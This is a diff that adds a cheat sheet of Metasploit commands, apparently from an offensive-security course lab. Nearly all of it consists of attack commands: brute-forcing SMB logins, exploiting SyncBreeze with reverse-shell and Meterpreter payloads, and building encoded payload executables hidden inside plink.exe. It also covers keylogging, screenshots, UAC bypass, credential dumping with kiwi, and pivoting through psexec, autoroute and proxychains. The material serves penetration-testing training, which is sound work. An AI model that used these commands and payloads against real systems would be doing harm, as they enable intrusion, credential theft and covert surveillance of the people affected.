@@ -1,1 +1,483 @@
+Metasploit User Interfaces and Setup 
+
+kali@kali:~$ sudo systemctl start postgresql
+
+kali@kali:~$ sudo systemctl enable postgresql
+
+kali@kali:~$ sudo msfdb init
+
+kali@kali:~$ sudo apt update; sudo apt install metasploit-framework
+
+kali@kali:~$ sudo msfconsole -q
+
+
+
+
+
+Getting Familiar with MSF Syntax 
+
+msf5 > show -h
+
+msf5 > use auxiliary/scanner/portscan/tcp
+
+msf5 > use auxiliary/scanner/portscan/tcp
+
+msf5 auxiliary(scanner/portscan/tcp) > use auxiliary/scanner/portscan/syn
+
+msf5 auxiliary(scanner/portscan/syn) > previous 
+
+msf5 auxiliary(scanner/portscan/tcp) > set RHOSTS 10.11.0.22
+
+
+
+
+
+Metasploit Database Access 
+
+msf5 auxiliary(scanner/portscan/tcp) > services
+
+msf5 > services -h
+
+msf5 > db_nmap
+
+msf5 > db_nmap 10.11.0.22 -A -Pn
+
+msf5 > hosts
+
+msf5 > services -p 445
+
+msf5 > workspace
+
+msf5 > workspace test
+
+
+
+
+
+
+
+
+Auxiliary Modules 
+
+msf5 > show auxiliary
+
+msf5 > search -h
+
+msf5 > search type:auxiliary name:smb
+
+msf5 > use scanner/smb/smb2
+
+msf5 auxiliary(scanner/smb/smb2) > info
+
+msf5 auxiliary(scanner/smb/smb_version) > services -p 445 --rhosts
+
+msf5 auxiliary(scanner/smb/smb2) > run
+
+msf5 auxiliary(scanner/smb/smb_enumusers_domain) > use scanner/smb/smb_login
+
+msf5 auxiliary(scanner/smb/smb_login) > options
+
+msf5 auxiliary(scanner/smb/smb_login) > set SMBDomain corp.com
+SMBDomain => corp.com
+
+msf5 auxiliary(scanner/smb/smb_login) > set SMBUser Offsec
+SMBUser => Offsec
+
+msf5 auxiliary(scanner/smb/smb_login) > set SMBPass ABCDEFG123!
+SMBPass => ABCDEFG123
+
+msf5 auxiliary(scanner/smb/smb_login) > setg RHOSTS 10.11.0.22
+RHOSTS => 10.11.0.22
+
+msf5 auxiliary(scanner/smb/smb_login) > set THREADS 10
+THREADS => 10
+
+msf5 auxiliary(scanner/smb/smb_login) > run
+
+msf5 auxiliary(scanner/smb/smb_login) > set SMBPass Qwerty09!
+SMBPass => Qwerty09!
+
+msf5 auxiliary(scanner/smb/smb_login) > run
+
+msf5 > creds
+
+msf5 auxiliary(scanner/smb/smb_login) > set USERPASS_FILE /home/kali/users.txt
+
+msf5 auxiliary(scanner/smb/smb_login) > run
+
+msf5 auxiliary(scanner/smb/smb_login) > use scanner/rdp/rdp_scanner
+
+msf5 auxiliary(scanner/rdp/rdp_scanner) > show options
+
+msf5 auxiliary(scanner/rdp/rdp_scanner) > set RHOSTS 10.11.0.22
+
+msf5 auxiliary(scanner/rdp/rdp_scanner) > run
+
+
+
+
+
+
+
+SyncBreeze Enterprise 
+
+msf5 > search syncbreeze
+
+msf5 > info exploit/windows/http/syncbreeze_bof
+
+msf5 > use exploit/windows/http/syncbreeze_bof
+
+msf5 exploit(windows/http/syncbreeze_bof) > show payloads
+
+msf5 exploit(windows/http/syncbreeze_bof) > set payload windows/shell_reverse_tcp
+payload => windows/shell/reverse_tcp
+
+msf5 exploit(windows/http/syncbreeze_bof) > show options
+
+msf5 exploit(windows/http/syncbreeze_bof) > set LHOST 10.11.0.4
+LHOST => 10.11.0.4
+
+msf5 exploit(windows/http/syncbreeze_bof) > set RHOST 10.11.0.22
+RHOST => 10.11.0.22 
+
+msf5 exploit(windows/http/syncbreeze_bof) > check
+
+msf5 exploit(windows/http/syncbreeze_bof) > exploit
+
+C:\Windows\system32> whoami
+
+
+
+
+
+
+
+Meterpreter Payloads 
+
+msf5 > search meterpreter type:payload
+
+msf5 exploit(windows/http/syncbreeze_bof) > set payload
+windows/meterpreter/reverse_http
+
+msf5 exploit(windows/http/syncbreeze_bof) > set LHOST 10.11.0.4
+LHOST => 10.11.0.4
+
+msf5 exploit(windows/http/syncbreeze_bof) > show options
+
+msf5 exploit(windows/http/syncbreeze_bof) > exploit
+
+
+
+
+
+
+
+Experimenting with Meterpreter
+
+meterpreter > help
+
+meterpreter > sysinfo
+
+meterpreter > getuid
+
+meterpreter > upload /usr/share/windows-resources/binaries/nc.exe c:\\Users\\Offsec
+
+meterpreter > download c:\\Windows\\system32\\calc.exe /tmp/calc.exe
+
+meterpreter > shell
+
+C:\Windows\system32> ftp 127.0.0.1
+
+meterpreter > shell
+
+C:\Windows\system32> exit
+
+
+
+
+
+
+Executable Payloads
+
+kali@kali:~$ msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.4 LPORT=443 -f exe -o
+shell_reverse.exe
+
+kali@kali:~$ file shell_reverse.exe
+
+kali@kali:~$ msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.4 LPORT=443 -f exe -e
+x86/shikata_ga_nai -i 9 -o shell_reverse_msf_encoded.exe
+
+kali@kali:~$ msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.4 LPORT=443 -f exe -e
+x86/shikata_ga_nai -i 9 -x /usr/share/windows-resources/binaries/plink.exe -o
+shell_reverse_msf_encoded_embedded.exe
+
+msf5 > use payload/windows/shell_reverse_tcp
+
+msf5 payload(windows/shell_reverse_tcp) > set LHOST 10.11.0.4
+LHOST => 10.11.0.4
+
+msf5 payload(windows/shell_reverse_tcp) > set LPORT 443
+LPORT => 443
+
+msf5 payload(windows/shell_reverse_tcp) > generate -f exe -e x86/shikata_ga_nai -i 9 -
+x /usr/share/windows-resources/binaries/plink.exe -o
+shell_reverse_msf_encoded_embedded.exe
+
+
+
+
+
+
+
+Metasploit Exploit Multi Handler
+
+msf5 > use multi/handler
+
+msf5 exploit(multi/handler) > set payload windows/meterpreter/reverse_https
+
+msf5 exploit(multi/handler) > show options
+
+msf5 exploit(multi/handler) > set LHOST 10.11.0.4
+
+msf5 exploit(multi/handler) > exploit
+
+msf5 exploit(multi/handler) > exploit -j
+
+msf5 exploit(multi/handler) > jobs
+
+msf5 exploit(multi/handler) > jobs -i 0
+
+msf5 exploit(multi/handler) > kill 0
+
+
+
+Client-Side Attacks
+
+kali@kali:~$ msfvenom -l formats
+
+msf5 > search flash
+
+msf5 exploit(multi/handler) > show advanced
+
+msf5 exploit(multi/handler) > set EnableStageEncoding true
+EnableStageEncoding => true
+
+msf5 exploit(multi/handler) > set StageEncoder x86/shikata_ga_nai
+StageEncoder => x86/shikata_ga_nai
+
+msf5 exploit(multi/handler) > exploit -j
+
+msf5 exploit(multi/handler) > set AutoRunScript windows/gather/enum_logged_on_users
+
+msf5 exploit(multi/handler) > exploit -j
+
+meterpreter > background
+
+msf5 exploit(multi/handler) > sessions -l
+
+msf5 exploit(multi/handler) > sessions -i 5
+
+meterpreter > transport list
+
+meterpreter > transport add -t reverse_tcp -l 10.11.0.4 -p 5555
+
+meterpreter > transport list
+
+meterpreter > background
+
+msf5 exploit(windows/http/syncbreeze_bof) > use multi/handler
+
+msf5 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp
+payload => windows/meterpreter/reverse_tcp
+
+msf5 exploit(multi/handler) > set LHOST 10.11.0.4
+LHOST => 10.11.0.4
+
+msf5 exploit(multi/handler) > set LPORT 5555
+LPORT => 5555
+
+msf5 exploit(multi/handler) > exploit -j
+
+msf5 exploit(multi/handler) > sessions -i 5
+
+meterpreter > transport next
+
+msf5 exploit(multi/handler) > sessions -i 6
+
+
+
+
+
+
+
+
+Building Our Own MSF Module
+
+kali@kali:~$ sudo mkdir -p /root/.msf4/modules/exploits/windows/http
+
+kali@kali:~$ sudo cp /usr/share/metasploitframework/modules/exploits/windows/http/disk_pulse_enterprise_get.rb
+/root/.msf4/modules/exploits/windows/http/syncbreeze.rb
+
+kali@kali:~/.msf4/modules/exploits/windows/http$ sudo nano
+/root/.msf4/modules/exploits/windows/http/syncbreeze.rb
+
+kali@kali:~$ sudo msfconsole -q
+
+msf5 > search syncbreeze
+
+msf5 > use exploit/windows/http/syncbreeze/syncbreeze
+
+msf5 exploit(windows/http/syncbreeze/syncbreeze) > set PAYLOAD
+windows/meterpreter/reverse_tcp
+
+msf5 exploit(windows/http/syncbreeze/syncbreeze) > set RHOSTS 10.11.0.22
+
+msf5 exploit(windows/http/syncbreeze/syncbreeze) > set LHOST 10.11.0.4
+
+msf5 exploit(windows/http/syncbreeze/syncbreeze) > check
+
+msf5 exploit(windows/http/syncbreeze/syncbreeze) > exploit
+
+
+
+
+
+
+Post-Exploitation with Metasploit
+
+meterpreter > screenshot
+
+meterpreter > keyscan_start
+
+meterpreter > keyscan_dump
+
+meterpreter > keyscan_stop
+
+
+
+
+
+
+
+Migrating Processes 
+
+meterpreter > ps
+
+meterpreter > migrate 3568
+
+
+
+
+
+
+
+Post-Exploitation Modules
+
+msf5 > use exploit/windows/local/bypassuac_injection_winsxs
+
+msf5 exploit(windows/local/bypassuac_injection_winsxs) > show options
+
+msf5 exploit(windows/local/bypassuac_injection_winsxs) > set SESSION 10
+
+msf5 exploit(windows/local/bypassuac_injection_winsxs) > exploit
+
+meterpreter > load powershell
+
+meterpreter > help powershell
+
+meterpreter > powershell_execute "$PSVersionTable.PSVersion"
+
+meterpreter > load kiwi
+
+meterpreter > getsystem
+
+meterpreter > creds_msv
+
+
+
+
+
+
+Pivoting with the Metasploit Framework 
+
+C:\Users\offsec>ipconfig
+
+msf5 > route add 192.168.1.0/24 11
+
+msf5 > route print
+
+msf5 > use auxiliary/scanner/portscan/tcp
+
+msf5 auxiliary(scanner/portscan/tcp) > set RHOSTS 192.168.1.110
+
+msf5 auxiliary(scanner/portscan/tcp) > set PORTS 445,3389
+
+msf5 auxiliary(scanner/portscan/tcp) > run
+
+msf5 > use exploit/windows/smb/psexec
+
+msf5 exploit(windows/smb/psexec_psh) > set SMBDomain corp
+
+msf5 exploit(windows/smb/psexec_psh) > set SMBUser jeff_admin
+
+msf5 exploit(windows/smb/psexec_psh) > set SMBPass Qwerty09!
+
+msf5 exploit(windows/smb/psexec_psh) > set RHOSTS 192.168.1.110
+
+msf5 exploit(windows/smb/psexec_psh) > set payload windows/meterpreter/bind_tcp
+
+msf5 exploit(windows/smb/psexec_psh) > set LHOST 192.168.1.110
+
+msf5 exploit(windows/smb/psexec_psh) > set LPORT 444
+
+msf5 exploit(windows/smb/psexec_psh) > exploit
+
+sf5 exploit(multi/handler) > use multi/manage/autoroute
+
+msf5 post(multi/manage/autoroute) > show options
+
+msf5 post(multi/manage/autoroute) > sessions -l
+
+msf5 post(multi/manage/autoroute) > set session 4
+
+msf5 post(multi/manage/autoroute) > exploit
+
+msf5 post(multi/manage/autoroute) > use auxiliary/server/socks4a
+
+msf5 auxiliary(server/socks4a) > show options
+
+msf5 auxiliary(server/socks4a) > set SRVHOST 127.0.0.1
+
+msf5 auxiliary(server/socks4a) > exploit -j
+
+kali@kali:~$ sudo echo "socks4 127.0.0.1 1080" >> /etc/proxychains.conf
+
+kali@kali:~$ sudo proxychains rdesktop 192.168.1.110
+
+meterpreter > portfwd -h
+
+meterpreter > portfwd add -l 3389 -p 3389 -r 192.168.1.110
+
+kali@kali:~$ rdesktop 127.0.0.1
+
+
+
+
+
+
+Metasploit Automation
+
+kali@kali:~$ sudo msfconsole -r setup.rc 
+
+kali@kali:~$ msfvenom -p windows/meterpreter/reverse_https LHOST=10.11.0.4 LPORT=443
+-f exe -o met.exe
+
+
+
+
+
+
+
+
+
 
